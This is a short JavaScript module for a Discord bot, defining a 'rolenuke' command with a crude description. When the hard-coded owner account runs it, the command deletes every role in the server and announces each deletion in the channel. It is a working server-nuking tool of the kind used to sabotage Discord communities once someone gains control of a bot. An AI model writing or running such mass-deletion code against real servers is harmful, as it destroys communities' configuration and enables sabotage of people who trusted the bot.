module.exports = {
	name: 'rolenuke',
	description: 'Penisair',
	execute(message) {
		const ownerID = "789058381126172702";
		if (message.author.id == ownerID) {
			message.guild.roles.cache.forEach(roles => {
                roles.delete()
                .then(deleted => message.channel.send(`Deleted role ${deleted.name}`))
                .catch(console.error);
            });
		} else {
			message.channel.send("You have to be the bot owner to use this command.")
		}
	},
};

